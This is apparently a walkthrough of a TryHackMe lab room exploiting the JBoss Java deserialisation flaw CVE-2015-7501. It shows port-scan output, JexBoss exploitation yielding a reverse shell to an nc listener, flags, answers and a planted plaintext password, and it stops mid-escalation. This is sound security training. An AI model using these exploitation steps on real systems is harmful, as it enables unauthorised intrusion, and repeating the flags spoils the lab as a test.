---
Learn how to use a Java Serialisation attack in this boot-to-root
---

### Deploy!

 Start Machine

Firstly, ensure you are connected to the TryHackMe network via either the VPN Service or Kali Instance (subscribed members only). If you are not using the [Kali Instance](https://tryhackme.com/room/kali), you can [verify connectivity to the THM network on the "access" page](https://tryhackme.com/access). Or if you are new, you can learn how to connect by [visiting the OpenVPN Room](https://tryhackme.com/room/openvpn).

**Please allow up towards five minutes for this instance to fully boot - even as a subscribed member.** This is not a TryHackMe or AWS bottleneck, rather Java being Java and the web application taking time to fully initialise after boot.  

  

Your Instance IP Address: `MACHINE_IP`

Deploying now and proceeding with the material below should allow for plenty of time for the instance to fully boot.

### Support Material

Whilst this is a CTF-style room, as the approach to ultimately "rooting" the box is new to TryHackMe, I will explain it a little and leave you to experiment with. There are flags laying around that aren't focused on the CVE, so I still encourage exploring this room. Explaining the whole-theory behind it is a little out of scope for this. However, I have provided some further reading material that may help with the room - or prove interesting!

  

What is "Serialisation"?

Serialisation at an abstract is the process of converting data - specifically "Objects" in Object-Oriented Programming (OOP) languages such as Java into lower-level formatting known as "byte streams", where it can be stored for later use such as within files, databases, and/or traversed across a network. It is then later converted from this "byte stream" back into the higher-level "Object". This final conversion is known as "De-serialisation"

  

![](https://media.geeksforgeeks.org/wp-content/uploads/serialization-5.jpg)

                                                                            (kindly taken from [https://www.geeksforgeeks.org/classes-objects-java/](https://www.geeksforgeeks.org/classes-objects-java/))

  

So what is an "Object"?

"Objects" in a programming-context can be compared to real-life examples. Simply, an "Object" is just that - a thing. "Objects" can contain various types of information such as states or features. To correlate to a real-world example...Let's take a lamp.

A lamp is a great "Object". a lamp can be on or off, the lamp can have different types of bulbs - but ultimately it is still a lamp. What type of bulb it uses and whether or not the lamp is "on" or "off" in this instance is all stored within an "Object".

  

How can we exploit this process?

A "serialisation" attack is the injection and/or modification of data throughout the "byte stream" stage. When this data is later accessed by the application, malicious code can result in serious implications...ranging from DoS, data leaking or much more nefarious attacks like being "rooted"! Can you see where this is going...?

Answer the questions below

What is a great IRL example of an "Object"?

*lamp*

What is the acronym of a possible type of attack resulting from a "serialisation" attack?

*DoS*

What lower-level format does data within "Objects" get converted into?

*byte stream*


### Reconnaissance

Your first reaction to being presented with an instance should be information gathering.

Answer the questions below

```
┌──(kali㉿kali)-[/]
└─$ rustscan -a 10.10.35.101 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.35.101:22
Open 10.10.35.101:80
Open 10.10.35.101:1090
Open 10.10.35.101:1091
Open 10.10.35.101:1098
Open 10.10.35.101:1099
Open 10.10.35.101:3873
Open 10.10.35.101:4446
Open 10.10.35.101:4713
Open 10.10.35.101:4712
Open 10.10.35.101:5445
Open 10.10.35.101:5455
Open 10.10.35.101:5500
Open 10.10.35.101:5501
Open 10.10.35.101:8009
Open 10.10.35.101:8080
Open 10.10.35.101:8083
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-28 13:04 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
Initiating Ping Scan at 13:04
Scanning 10.10.35.101 [2 ports]
Completed Ping Scan at 13:04, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:04
Completed Parallel DNS resolution of 1 host. at 13:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:04
Scanning 10.10.35.101 [17 ports]
Discovered open port 80/tcp on 10.10.35.101
Discovered open port 8009/tcp on 10.10.35.101
Discovered open port 5501/tcp on 10.10.35.101
Discovered open port 22/tcp on 10.10.35.101
Discovered open port 8080/tcp on 10.10.35.101
Discovered open port 5455/tcp on 10.10.35.101
Discovered open port 4712/tcp on 10.10.35.101
Discovered open port 1098/tcp on 10.10.35.101
Discovered open port 8083/tcp on 10.10.35.101
Discovered open port 3873/tcp on 10.10.35.101
Discovered open port 1091/tcp on 10.10.35.101
Discovered open port 1099/tcp on 10.10.35.101
Discovered open port 4446/tcp on 10.10.35.101
Discovered open port 5500/tcp on 10.10.35.101
Discovered open port 1090/tcp on 10.10.35.101
Discovered open port 5445/tcp on 10.10.35.101
Discovered open port 4713/tcp on 10.10.35.101
Completed Connect Scan at 13:04, 0.41s elapsed (17 total ports)
Initiating Service scan at 13:04
Scanning 17 services on 10.10.35.101
Completed Service scan at 13:07, 162.10s elapsed (17 services on 1 host)
NSE: Script scanning 10.10.35.101.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 29.79s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 1.47s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.01s elapsed
Nmap scan report for 10.10.35.101
Host is up, received syn-ack (0.21s latency).
Scanned at 2022-12-28 13:04:28 EST for 194s

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6978cb974d0f39efef3a5eaf8a9b57a (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJPG6mnFmBQ6zzd48LN35Vr7O1QkkSffOIQQl6+I5OKm/mqA4RK7QEgDEsFRgDcAaZDCv57bLTAEet7u5+Zxl7tK1NYS6PoJKP/V/SUL8HvdCjN7ECGgZbNl1/lD2oN4Ht0vLBiWOTNf+iBYAmszAuQuoFeQukynY+Yp6Vzm+deBAAAAFQCh+o/BZzN10pb6E32v/9UtFQVZYwAAAIBaQDnXWFqzvVdR41SJKzIHGovDvTeYRkriEOY/qsul50Qa6wUXBKj6g4Ew6E5JyqmA0OTtqCaduEVZghWFZC1xgfIMWDF0jrWLoeulkHS+66e6w4RTNYhkaQFReNQqYutiYLVItPYCGYTx6EjkenuOrjtBbDuKtzAqqCr5AwFjoAAAAIAdqC5XcUGUTNz60yiAP68wM4aw1QHCvR5uUU9rjc06XHjoddKpIGSoR99yxMh7iRZ1TrBRb3mvIdnJ5G6DcH9xgyvHz8Fc1VcBndlh7Ie18Bigs1hj5DmM7H73zB2U2zzoy8Kk8uYn9EprmEKQIqVKGLhH4zspFxBstbD3Ti9Xhg==
|   2048 33a47b9138585030892de457bb07bb2f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJTMdZ85+2MMzpdBPGCdSABGMN18/c4vhXcagSDSsQmLGhObXdYue1DcrmPR2QVJV7aRV9qYYEymcJdwNcCTul7C+gpyj4pD93L6Uxcsi7O3raxysBwWbrIrIYf7n8zKmOZcZeMbweXfgU6eXfnVHwivPkzTivg5uc7HdEfDHfDzE+2ScejK8+pQtkv2pGpXN8WC1/l0LO2YWgJ6cq1LkOkgTTqboi1wTsHhjUr7Ri+LAhiIHmAqmGWMH1q3p8y2NM+Hn4q1Po8Z4qOkl0u3XUm6iX/XWTXkCKTHFLnG33FbLQcMLJKPHP0azNw43UOz7EyVLQEFXSw60qsIdxuu55
|   256 21018b37f51e2bc557f1b042b732abea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmZ/g9gjkYbkCJ0BOQ7aNFijuj76pmv22y9wcRJJ3W0+lZkserfSgieJMHkRJcYRYlwRS804F9XM3cqr1tjNA0=
|   256 f636073c3b3d7130c4cd2a1300b525ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDUpCopvQzPXtEJ8L/lxYpJzOrcLLkU67fx71+Izsx6U
80/tcp   open  http        syn-ack Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Hugo 0.66.0
|_http-title: Tony&#39;s Blog
|_http-server-header: Apache/2.4.7 (Ubuntu)
1090/tcp open  java-rmi    syn-ack Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1091/tcp open  java-rmi    syn-ack Java RMI
1098/tcp open  java-rmi    syn-ack Java RMI
1099/tcp open  java-object syn-ack Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     }(ur
|     #http://thm-java-deserial.home:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpwA
|     UnicastRef2
|_    thm-java-deserial.home
3873/tcp open  java-object syn-ack Java Object Serialization
4446/tcp open  java-object syn-ack Java Object Serialization
4712/tcp open  msdtc       syn-ack Microsoft Distributed Transaction Coordinator (error)
4713/tcp open  pulseaudio? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    126a
5445/tcp open  smbdirect?  syn-ack
5455/tcp open  apc-5455?   syn-ack
5500/tcp open  hotline?    syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     DIGEST-MD5
|     CRAM-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   DNSVersionBindReqTCP, RTSPRequest, TLSSessionReq: 
|     GSSAPI
|     DIGEST-MD5
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   GenericLines, NULL: 
|     DIGEST-MD5
|     CRAM-MD5
|     NTLM
|     GSSAPI
|     thm-java-deserial
|   GetRequest: 
|     DIGEST-MD5
|     GSSAPI
|     CRAM-MD5
|     NTLM
|     thm-java-deserial
|   HTTPOptions, RPCCheck: 
|     NTLM
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     thm-java-deserial
|   Help: 
|     NTLM
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   Kerberos: 
|     DIGEST-MD5
|     GSSAPI
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   SSLSessionReq: 
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     NTLM
|     thm-java-deserial
|   TerminalServerCookie: 
|     NTLM
|     CRAM-MD5
|     GSSAPI
|     DIGEST-MD5
|_    thm-java-deserial
5501/tcp open  tcpwrapped  syn-ack
8009/tcp open  ajp13       syn-ack Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        syn-ack Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to JBoss AS
|_http-favicon: Unknown favicon MD5: 799F70B71314A7508326D1D2F68F7519
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
8083/tcp open  http        syn-ack JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.93%I=7%D=12/28%Time=63AC852D%P=x86_64-pc-linux-gnu%r(N
SF:ULL,17B,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x9
SF:7\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objBy
SF:tesq\0~\0\x01xpL\xc1}\(ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\0\0
SF:xp\0\0\x004\xac\xed\0\x05t\0#http://thm-java-deserial\.home:8083/q\0~\0
SF:\0q\0~\0\0uq\0~\0\x03\0\0\0\xcd\xac\xed\0\x05sr\0\x20org\.jnp\.server\.
SF:NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.R
SF:emoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server
SF:\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpwA\0\x0bUnicastRef2\0\0\
SF:x16thm-java-deserial\.home\0\0\x04J>\xa7\x03j\x06\xb8\xbem\xb1\xe2\x89\
SF:xd0\0\0\x01\x85Y\xb7\0\x9f\x80\x02\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3873-TCP:V=7.93%I=7%D=12/28%Time=63AC8533%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.93%I=7%D=12/28%Time=63AC8533%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4713-TCP:V=7.93%I=7%D=12/28%Time=63AC8533%P=x86_64-pc-linux-gnu%r(N
SF:ULL,5,"126a\n")%r(GenericLines,5,"126a\n")%r(GetRequest,5,"126a\n")%r(H
SF:TTPOptions,5,"126a\n")%r(RTSPRequest,5,"126a\n")%r(RPCCheck,5,"126a\n")
SF:%r(DNSVersionBindReqTCP,5,"126a\n")%r(DNSStatusRequestTCP,5,"126a\n")%r
SF:(Help,5,"126a\n")%r(SSLSessionReq,5,"126a\n")%r(TerminalServerCookie,5,
SF:"126a\n")%r(TLSSessionReq,5,"126a\n")%r(Kerberos,5,"126a\n")%r(SMBProgN
SF:eg,5,"126a\n")%r(X11Probe,5,"126a\n")%r(FourOhFourRequest,5,"126a\n")%r
SF:(LPDString,5,"126a\n")%r(LDAPSearchReq,5,"126a\n")%r(LDAPBindReq,5,"126
SF:a\n")%r(SIPOptions,5,"126a\n")%r(LANDesk-RC,5,"126a\n")%r(TerminalServe
SF:r,5,"126a\n")%r(NCP,5,"126a\n")%r(NotesRPC,5,"126a\n")%r(JavaRMI,5,"126
SF:a\n")%r(WMSRequest,5,"126a\n")%r(oracle-tns,5,"126a\n")%r(ms-sql-s,5,"1
SF:26a\n")%r(afp,5,"126a\n")%r(giop,5,"126a\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5500-TCP:V=7.93%I=7%D=12/28%Time=63AC8533%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGE
SF:ST-MD5\x01\x08CRAM-MD5\x01\x04NTLM\x01\x06GSSAPI\x02\x11thm-java-deseri
SF:al")%r(GenericLines,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0
SF:\0\x02\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x04NTLM\x01\x06GSSAPI\x02\x1
SF:1thm-java-deserial")%r(GetRequest,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x
SF:03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\
SF:x04NTLM\x02\x11thm-java-deserial")%r(HTTPOptions,4B,"\0\0\0G\0\0\x01\0\
SF:x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x06GSSAPI\x01\x08CR
SF:AM-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(RTSPRequest,4B,"\0\
SF:0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\nD
SF:IGEST-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deserial")%r(RPCC
SF:heck,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04N
SF:TLM\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deser
SF:ial")%r(DNSVersionBindReqTCP,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x0
SF:3\x04\0\0\0\x02\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x04NTLM\x01\x08CRAM-M
SF:D5\x02\x11thm-java-deserial")%r(DNSStatusRequestTCP,4B,"\0\0\0G\0\0\x01
SF:\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x08CRAM-MD5\
SF:x01\x06GSSAPI\x01\x04NTLM\x02\x11thm-java-deserial")%r(Help,4B,"\0\0\0G
SF:\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x08CRAM-
SF:MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x02\x11thm-java-deserial")%r(SSLSessi
SF:onReq,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06
SF:GSSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x04NTLM\x02\x11thm-java-dese
SF:rial")%r(TerminalServerCookie,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x
SF:03\x04\0\0\0\x02\x01\x04NTLM\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\nDIGEST-
SF:MD5\x02\x11thm-java-deserial")%r(TLSSessionReq,4B,"\0\0\0G\0\0\x01\0\x0
SF:3\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x04
SF:NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deserial")%r(Kerberos,4B,"\0\0\0G\
SF:0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x06GS
SF:SAPI\x01\x04NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deserial");
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.28 seconds

https://es.wikipedia.org/wiki/WildFly

JBoss es un servidor de aplicaciones Java EE de código abierto implementado en Java puro.  Al estar basado en Java, JBoss puede ser utilizado en cualquier sistema operativo, para así estar disponible la máquina virtual de Java.  JBoss implementa todo el estándar JEE.  El  «JBoss Enterprise Application Platform» es el primer servidor de aplicaciones de código abierto, preparado para la producción y certificado JEE 6.0, disponible en el mercado, ofreciendo una plataforma de alto rendimiento para aplicaciones de e-business.

http://10.10.35.101:8080/ (JBoss RedHat)


```

What service is running on port "8080"

*Apache Tomcat/Coyote JSP engine 1.1*

What is the name of the front-end application running on "8080"?

*JBoss*


### Find Tony's Flag!

Tony has started a _totally_ unbiased blog about taste-testing various cereals! He'd love for you to have a read...

Answer the questions below

This flag will have the formatting of "THM{}"

```
┌──(kali㉿kali)-[/]
└─$ curl -s http://10.10.35.101/posts/frosted-flakes/ | grep img
  <link rel='icon' type='image/x-icon' href="https://i.imgur.com/ATbbYpN.jpg" />
<p><img src="https://i.imgur.com/be2sOV9.jpg" alt="FrostedFlakes"></p>
    <img alt="Author Avatar" src="https://i.imgur.com/ATbbYpN.jpg" />

┌──(kali㉿kali)-[~]
└─$ wget https://i.imgur.com/be2sOV9.jpg
--2022-12-28 13:45:09--  https://i.imgur.com/be2sOV9.jpg
Resolving i.imgur.com (i.imgur.com)... 199.232.32.193
Connecting to i.imgur.com (i.imgur.com)|199.232.32.193|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 84746 (83K) [image/jpeg]
Saving to: ‘be2sOV9.jpg’

be2sOV9.jpg                 100%[=========================================>]  82.76K  --.-KB/s    in 0.1s    

2022-12-28 13:45:10 (823 KB/s) - ‘be2sOV9.jpg’ saved [84746/84746]

┌──(kali㉿kali)-[~]
└─$ strings be2sOV9.jpg | grep THM 
}THM{Tony_Sure_Loves_Frosted_Flakes}
'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ

```

![222](https://i.imgur.com/be2sOV9.jpg)

*THM{Tony_Sure_Loves_Frosted_Flakes}*

### Exploit!

Download the attached resources (48.3MB~) to this task by pressing the "Download" icon within this task.

FILE NAME: **jboss.zip (48.3MB~)**

MD5 CHECKSUM: **ED2B009552080A4E0615451DB0769F8B**

The attached resources are compiled together to ensure that everyone is able to complete the exploit, **these resources are not my own creations** (although have been very slightly modified for compatibility) **and all credit is retained to the respective authors listed within "credits.txt"** as well as the end of the room.

![](https://i.imgur.com/a1yznLT.png)

It is your task to research the vulnerability [CVE-2015-7501](https://www.rapid7.com/db/vulnerabilities/http-jboss-cve-2015-7501) and to use it to obtain a shell to the instance using the payload & exploit provided. There may be a few ways of doing it...If you are struggling, [I have written an example of how this vulnerability is used to launch an application on Windows.](https://blog.cmnatic.co.uk/posts/exploiting-java-deserialization-windows-demo/)

There's also a couple of ways of exploiting this service - I really encourage you to investigate into them yourself!

Answer the questions below

I have obtained a shell.


```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/JBoss%20CVE-2015-7501.py

https://github.com/byt3bl33d3r/java-deserialization-exploits/blob/master/JBoss/jboss.py

┌──(kali㉿kali)-[~/tony_tiger/jboss]
└─$ ls
credits.txt  exploit.py  ysoserial.jar
                                                                                                              
┌──(kali㉿kali)-[~/tony_tiger/jboss]
└─$ cat credits.txt  

----------------------------
DISCLAIMER:
----------------------------

I (CMNatic) do not claim any credit for the following code provided, I have merely gathered it together for use on THM for educational purposes.

All accredition is to the respective authors. 


----------------------------
(CVE-2015-7501 - exploit.py)
----------------------------
For the PoC Exploit written in Python (exploit.py): 

Author: @byt3bl33d3r
Website: https://github.com/byt3bl33d3r
Available at: https://github.com/byt3bl33d3r/java-deserialization-exploits/blob/master/JBoss/jboss.py

----------------------------
YSOSERIAL Payload
----------------------------
Java library used to generate the payload (Apache Commons, etc) within the PoC / CVE

Author(s): Chris Frohoff (frohoff)
Website: https://github.com/frohoff
Available at: https://github.com/frohoff/ysoserial

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337


uhmm not work, let's try another

https://github.com/joaomatosf/jexboss


git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
pip install -r requires.txt
python jexboss.py -h

┌──(kali㉿kali)-[~/tony_tiger/jexboss]
└─$ python jexboss.py -host http://10.10.112.241:8080


 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |  * And others Java Deserialization Vulnerabilities * | 
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#

 @version: 1.2.4

 * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **


 ** Checking Host: http://10.10.112.241:8080 **

 [*] Checking jmx-console:                 
  [ VULNERABLE ]
 [*] Checking web-console:                 
  [ OK ]
 [*] Checking JMXInvokerServlet:           
  [ VULNERABLE ]
 [*] Checking admin-console:               
  [ EXPOSED ]
 [*] Checking Application Deserialization: 
  [ OK ]
 [*] Checking Servlet Deserialization:                                                                        
  [ OK ]
 [*] Checking Jenkins:                                                                                        
  [ OK ]
 [*] Checking Struts2:                                                                                        
  [ OK ]
                                                                                                              
                                                                                                              
 * Do you want to try to run an automated exploitation via "jmx-console" ?                                    
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? no

                                                                                                              
 * Do you want to try to run an automated exploitation via "JMXInvokerServlet" ?                              
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

 * Sending exploit code to http://10.10.112.241:8080. Please wait...                                          
                                                                                                              
 * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.          
   OBS: You can also use the --cmd "command" to send specific commands to run on the server.                  
   IP Address (RHOST): 10.8.19.103
   Port (RPORT): 4444

 * The exploit code was successfully sent. Check if you received the reverse shell
   connection on your server or if your command was executed.                                                 
   Type [ENTER] to continue... 

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.112.241.
Ncat: Connection from 10.10.112.241:55650.
bash: cannot set terminal process group (816): Inappropriate ioctl for device
bash: no job control in this shell
cmnatic@thm-java-deserial:/$ import TERM=xterm
import TERM=xterm
The program 'import' can be found in the following packages:
 * imagemagick
 * graphicsmagick-imagemagick-compat
Ask your administrator to install one of them
cmnatic@thm-java-deserial:/$ SHELL=/bin/bash script -q /dev/null
SHELL=/bin/bash script -q /dev/null
cmnatic@thm-java-deserial:/$ whoami
cmnatic
cmnatic@thm-java-deserial:/$ 



```


###  Find User JBoss' flag!

Knowledge of the Linux (specifically Ubuntu/Debian)'s file system structure & permissions is expected. If you are struggling, I strongly advise checking out the [Linux Fundamentals module](https://tryhackme.com/module/linux-fundamentals).

Answer the questions below

This flag has the formatting of "THM{}"

```
cmnatic@thm-java-deserial:/$ find / -type f -name user.txt 2>/dev/null

cmnatic@thm-java-deserial:/$ grep -R "THM{" 2>/dev/null


home/jboss/.jboss.txt:THM{50c10ad46b5793704601ecdad865eb06}
home/jboss/.bash_history:echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt

```

*THM{50c10ad46b5793704601ecdad865eb06}*


### Escalation!

Normal boot-to-root expectations apply here! It is located in /root/root.txt. Get cracking :)

Answer the questions below

The final flag **does not** have the formatting of **"THM{}"**

We will, we will Rock You...

```
cmnatic@thm-java-deserial:/home/jboss$ ls -lah
total 36K
drwxr-xr-x 3 jboss   jboss   4.0K Mar  7  2020 .
drwxr-xr-x 5 root    root    4.0K Mar  6  2020 ..
-rwxrwxrwx 1 jboss   jboss    181 Mar  7  2020 .bash_history
-rw-r--r-- 1 jboss   jboss    220 Mar  6  2020 .bash_logout
-rw-r--r-- 1 jboss   jboss   3.6K Mar  6  2020 .bashrc
drwx------ 2 jboss   jboss   4.0K Mar  7  2020 .cache
-rw-rw-r-- 1 cmnatic cmnatic   38 Mar  6  2020 .jboss.txt
-rw-r--r-- 1 jboss   jboss    675 Mar  6  2020 .profile
-rw-r--r-- 1 cmnatic cmnatic  368 Mar  6  2020 note
cmnatic@thm-java-deserial:/home/jboss$ cat .jboss.txt
THM{50c10ad46b5793704601ecdad865eb06}
cmnatic@thm-java-deserial:/home/jboss$ cat .bash_history
touch jboss.txt
echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt
mv jboss.txt .jboss.txt
exit
sudo -l
exit
ls
ls -lah
nano .bash_history
ls
cd ~
ls
nano .bash_history 
exit
cmnatic@thm-java-deserial:/home/jboss$ cat note
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic

cmnatic@thm-java-deserial:/home$ cd cmnatic
cmnatic@thm-java-deserial:~$ ls
jboss  to-do.txt
cmnatic@thm-java-deserial:~$ cat to-do.txt
I like to keep a track of the various things I do throughout the day.

Things I have done today:
 - Added a note for JBoss to read for when he next logs in.
 - Helped Tony setup his website!
 - Made sure that I am not an administrator account 

Things to do:
 - Update my Java! I've heard it's kind of in-secure, but it's such a headache to update. Grrr!


cmnatic@thm-java-deserial:~$ cd jboss
cmnatic@thm-java-deserial:~/jboss$ ls
LICENSE.txt  bin     common         docs              lib
README.txt   client  copyright.txt  jar-versions.xml  server

